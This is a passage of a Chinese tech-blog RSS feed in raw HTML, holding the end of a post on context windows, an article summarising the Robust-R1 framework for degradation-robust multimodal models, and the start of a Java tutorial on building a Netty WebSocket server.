<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1266feba351041f2b1d8f6364bedddf9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oGL54yrZGXlsI_pg60=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768878014&amp;x-signature=JvgavNkH%2Bs8z6V2g6pe8AfnSbL4%3D" alt="" loading="lazy"/></p>
<p>所以也许接下来，<strong>问题不在于我们如何把更多 token 塞进窗口，而在于我们如何让 AI 智能地导航无限的信息</strong> ，这也标志着或者“大上下文窗口”时代即将终结，也许 AI 不再需要更大的窗口，AI 需要的是更聪明的“导航员”</p>
<h2 data-id="heading-0">参考链接</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fhtml%2F2512.24601v1" target="_blank" title="https://arxiv.org/html/2512.24601v1" ref="nofollow noopener noreferrer">arxiv.org/html/2512.2…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为AI装上“纠偏”思维链，开源框架Robust-R1显著提升多模态大模型抗退化能力]]></title>    <link>https://juejin.cn/post/7594351060614119443</link>    <guid>https://juejin.cn/post/7594351060614119443</guid>    <pubDate>2026-01-13T02:59:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594351060614119443" data-draft-id="7594350054091800618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为AI装上“纠偏”思维链，开源框架Robust-R1显著提升多模态大模型抗退化能力"/> <meta itemprop="keywords" content="算法,计算机视觉,深度学习"/> <meta itemprop="datePublished" content="2026-01-13T02:59:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为AI装上“纠偏”思维链，开源框架Robust-R1显著提升多模态大模型抗退化能力
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:59:36.000Z" title="Tue Jan 13 2026 02:59:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如今的多模态大语言模型（MLLMs）已经展现出令人惊叹的图像理解和推理能力，能够回答关于图片的问题、生成描述，甚至进行复杂的视觉推理。然而，一个长期存在的挑战是：<strong>当图像质量下降时——比如模糊、噪声、遮挡或光线不足——模型的性能往往会大幅下滑。</strong></p>
<p>在真实世界中，图像退化无处不在：拍摄时的抖动、传输中的压缩、恶劣天气下的雾霾、后期处理添加的水印……这些因素都可能导致AI“看走眼”，输出错误或荒谬的回答，限制了其在安防、自动驾驶、医疗影像等关键领域的可靠应用。</p>
<p>以往提升模型鲁棒性的方法，大多聚焦于<strong>增强视觉编码器的抗干扰能力</strong>，通过对抗训练、大规模对抗预训练等方式，让模型“习惯”各种失真。但这些方法存在两个根本局限：</p>
<ul>
<li><strong>可解释性差：</strong> 模型像一个黑箱，我们无法知道它到底是如何被退化影响的，也难以诊断错误来源。</li>
<li><strong>优化孤立：</strong> 只强化视觉部分，忽略了视觉编码器与大语言模型之间的信息传递链路，退化影响可能在推理阶段被放大。</li>
</ul>
<h2 data-id="heading-0"><strong>思路革新：从“隐式适应”到“显式推理”</strong></h2>
<p>近日，来自香港科技大学、西北工业大学等机构的研究团队提出了一种全新框架——Robust-R1，其核心思想是：<strong>不让模型默默忍受图像退化，而是教它主动识别退化、分析影响，并重建出清晰的语义理解。</strong></p>
<p>简单来说，Robust-R1为模型装备了一套“退化感知推理链”，使其能够：</p>
<ol>
<li><strong>感知退化参数</strong>（是什么退化？强度如何？）</li>
<li><strong>分析语义影响</strong>（这个退化对图中物体、场景、关系造成了什么干扰？）</li>
<li><strong>重建干净推理</strong>（如果图是清晰的，正确的推理链应该是什么？）</li>
<li><strong>生成最终答案</strong>（结合退化信息和重建后的理解，给出可靠回答）</li>
</ol>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fe3152541cd4ed282a8c0dd697867f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877976&amp;x-signature=qx7EyGEA4MywiR2FYElW9rN36zM%3D" alt="screenshot_2026-01-07_15-24-20.png" loading="lazy"/></p>
<p><strong>左边（A）</strong> 是传统方法，只关注视觉编码器的特征对齐；</p>
<p><strong>右边（B）</strong> 是Robust-R1，明确引入了一条从退化感知到语义重建的推理链条。</p>
<p>这不仅提高了模型在退化图像上的表现，还让它的推理过程<strong>变得可解释、可追踪</strong>——我们可以清楚地看到模型是如何一步步“纠偏”的。</p>
<h2 data-id="heading-1"><strong>三步训练法：教模型“识别退化、按需推理”</strong></h2>
<ul>
<li><strong>第一步：监督微调（SFT）—— 学习基本推理格式</strong></li>
</ul>
<p>团队首先构建了一个包含11K样本的数据集（基于A-OKVQA），为每张退化图像标注了完整的推理链，包含：</p>
<blockquote>
<p>&lt;类型&gt; 运动模糊，强度0.7 &lt;类型结束&gt;</p>
<p>&lt;影响&gt; 图中人物轮廓变得模糊，难以判断其动作 &lt;影响结束&gt;</p>
<p>&lt;推理&gt; 原图中人物正在跑步，背景为公园 &lt;推理结束&gt;</p>
<p>&lt;结论&gt; 因此，图中人物正在运动 &lt;结论结束&gt;</p>
</blockquote>
<p>模型通过学习这种结构化输出，初步掌握了“识别退化 → 分析影响 → 重建语义”的推理模式。</p>
<ul>
<li><strong>第二步：奖励对齐 —— 精准感知退化参数</strong></li>
</ul>
<p>仅仅会推理还不够，还要感知得准。研究团队设计了一个<strong>退化奖励函数</strong>，用于强化模型对退化类型和强度的判断准确性。</p>
<p>例如，如果模型把“运动模糊”误判为“高斯噪声”，就会受到惩罚；如果判断正确但强度估计有偏差，奖励也会相应减少。</p>
<ul>
<li><strong>第三步：动态长度调整 —— 按退化程度分配计算资源</strong></li>
</ul>
<p>研究发现：<strong>退化越严重，需要的推理步骤就越多。</strong> 如果对所有图像都使用相同深度的推理，会导致简单场景“想太多”（效率低下），复杂退化“想不够”（精度不足）。</p>
<p>因此，团队引入了<strong>长度奖励函数</strong>，鼓励模型根据退化强度自适应调整推理链的长度，实现“该长则长、该短则短”的高效推理。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb82bf30d36540ea973afea3979a729b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877976&amp;x-signature=HVGhB2fo6dlfXEuf4DWht%2Fulfb0%3D" alt="screenshot_2026-01-07_15-24-56.png" loading="lazy"/></p>
<p><strong>（A）监督微调阶段：</strong> 模型学习生成结构化推理链；</p>
<p><strong>（B）强化学习阶段：</strong> 通过两个奖励函数分别优化退化感知准确性和推理长度适宜性。</p>
<h2 data-id="heading-2"><strong>数据集构建：模拟真实世界的“退化全链路”</strong></h2>
<p>为了训练这样一个模型，研究团队系统地合成了覆盖图像<strong>采集 → 传输 → 环境 → 后处理</strong>四个阶段的退化类型，包括：</p>
<ul>
<li><strong>采集阶段：</strong> 镜头模糊、镜头光晕、运动模糊、脏镜头、过曝等</li>
<li><strong>传输阶段：</strong> 压缩失真、块效应、位移、扫描线等</li>
<li><strong>环境阶段：</strong> 低光照、大气湍流、噪声、颜色扩散等</li>
<li><strong>后处理阶段：</strong> 锐化改变、涂鸦、水印损伤等</li>
</ul>
<p>每种退化都随机采样强度，确保数据多样性。随后，利用GPT-4o自动生成每一步的推理文本，形成完整的训练样本。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98b43c7f8f7c48e38f3bc3d54785b34d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877976&amp;x-signature=%2FGc6BocWdiZXPDaZ2y59pLXiKR0%3D" alt="screenshot_2026-01-07_15-28-27.png" loading="lazy"/></p>
<p>从原始图像出发，经过多阶段退化合成，再逐步生成“影响描述”“干净推理”“最终结论”，最后根据退化强度对推理链进行长度缩放。</p>
<h2 data-id="heading-3"><strong>实验结果：在多项基准上显著领先</strong></h2>
<p>团队在多个标准测试集上验证了Robust-R1的有效性：</p>
<ul>
<li><strong>真实世界退化基准 R-Bench</strong></li>
</ul>
<p>在涵盖选择题、视觉问答、图像描述三类任务，并包含低、中、高三种退化强度的R-Bench上，Robust-R1在<strong>所有退化强度下均取得最佳整体性能</strong>，明显优于原版Qwen2.5-VL、Gemma3等通用模型，也超过了TeCoA、Robust CLIP等专用鲁棒模型。</p>
<ul>
<li><strong>对抗性退化测试（MMMB、MMStar、RealWorldQA）</strong></li>
</ul>
<p>研究团队还对图像施加了25%、50%、100%三种强度的随机退化，模拟极端干扰条件。结果显示，Robust-R1的性能下降幅度<strong>显著小于所有基线模型</strong>，展现出强大的抗退化鲁棒性。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/75023463e22f4463993d266abcbfb0a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877976&amp;x-signature=o2shAAg5eqDbp9Y3dWb8tye%2Fk7Y%3D" alt="screenshot_2026-01-07_15-35-10.png" loading="lazy"/></p>
<p>可以看到，经过SFT和RL优化后，模型不仅能给出更准确的答案，还能生成清晰、结构化的推理过程，同时避免冗余输出。</p>
<h2 data-id="heading-4"><strong>消融实验：每个组件都不可或缺</strong></h2>
<p>为了验证各个部分的作用，团队进行了消融研究：</p>
<ul>
<li><strong>去掉推理链（仅微调）：</strong> 模型在高强度退化下性能崩溃，说明仅靠适应是不够的，<strong>显式推理至关重要。</strong></li>
<li><strong>去掉退化奖励：</strong> 模型对退化类型和强度的判断准确率下降，直接影响最终性能。</li>
<li><strong>去掉长度奖励：</strong> 推理链变得冗长，计算效率降低，且对性能无益。</li>
</ul>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec96ddcda6af4f84887f93abc37ca5bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877976&amp;x-signature=Dl2DSs41oeIGkafeJMc%2FVkjcIwc%3D" alt="screenshot_2026-01-07_15-35-38.png" loading="lazy"/></p>
<h2 data-id="heading-5"><strong>总结与展望</strong></h2>
<p>Robust-R1 不仅仅是一个“更强壮的模型”，更是一套“更聪明的视觉理解范式”。它首次将退化感知与结构化推理深度融合，让模型在面对质量不佳的输入时，能够像人类一样“脑补”信息、排除干扰，最终做出可靠判断。</p>
<p>这一研究为多模态大模型的鲁棒性提升开辟了新路径：可解释、可控制、高效率。未来，这类方法有望广泛应用于自动驾驶、视频监控、遥感影像分析、老旧影像修复等对噪声和退化极为敏感的领域。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于Netty的WebSocket服务端]]></title>    <link>https://juejin.cn/post/7594337566722146314</link>    <guid>https://juejin.cn/post/7594337566722146314</guid>    <pubDate>2026-01-13T01:10:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594337566722146314" data-draft-id="7594383365417680942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于Netty的WebSocket服务端"/> <meta itemprop="keywords" content="后端,Java,程序员"/> <meta itemprop="datePublished" content="2026-01-13T01:10:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SimonKing"/> <meta itemprop="url" content="https://juejin.cn/user/4001878056904584"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于Netty的WebSocket服务端
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4001878056904584/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SimonKing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:10:05.000Z" title="Tue Jan 13 2026 01:10:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>关注我的公众号：【编程朝花夕拾】，可获取首发内容。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/273e78394c7642f7b75ef444c3b5d64f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768871404&amp;x-signature=FMn3orGLbdMEIUSXZyCHMB3BypY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">01 引言</h2>
<p>前面用了两节内容介绍了基于Netty的TCP的Socket的相关内容。这一节开始我们介绍基于Netty的WebSocket的相关内容，我们同样可以按照服务端和客户端的方式分别介绍。本节我们介绍WebSocket的服务端。</p>
<h2 data-id="heading-1">02 示例代码</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketServer</span> {

    <span class="hljs-meta">@Getter</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">ChannelGroup</span> <span class="hljs-variable">channelGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultChannelGroup</span>(GlobalEventExecutor.INSTANCE);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();

        <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">serverBootstrap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
        serverBootstrap.group(bossGroup, workGroup);
        serverBootstrap.channel(NioServerSocketChannel.class);
        serverBootstrap.childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;(){

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel socketChannel)</span> <span class="hljs-keyword">throws</span> Exception {
                <span class="hljs-type">ChannelPipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> socketChannel.pipeline();
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerCodec</span>());
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpObjectAggregator</span>(<span class="hljs-number">65535</span>));
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServerProtocolHandler</span>(<span class="hljs-string">"/testWs"</span>));
                <span class="hljs-comment">// 自定义的handler，处理业务逻辑</span>
                pipeline.addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebBusinessHandler</span>(channelGroup));
            }
        });

        <span class="hljs-comment">// 配置完成，开始绑定server，通过调用sync同步方法阻塞直到绑定成功</span>
        <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> serverBootstrap.bind(<span class="hljs-number">9090</span>).sync();
        log.info(<span class="hljs-string">"Server started and listen on:{}"</span>,channelFuture.channel().localAddress());
        <span class="hljs-comment">// 对关闭通道进行监听</span>
        channelFuture.channel().closeFuture().sync();
    }
}
</code></pre>
<h3 data-id="heading-2">2.1 引导类</h3>
<p>引导类同样是<code>io.netty.bootstrap.ServerBootstrap</code>，和TCP协议的服务端一样，但是细节不同。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
<span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();

<span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">serverBootstrap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
serverBootstrap.group(bossGroup, workGroup);
serverBootstrap.channel(NioServerSocketChannel.class);
</code></pre>
<p>保活的配置一般会有心跳的代替，所以一般也就没有要设置了。线程组可以根据需要设置，一个接收任务，一个处理任务分工协作。</p>
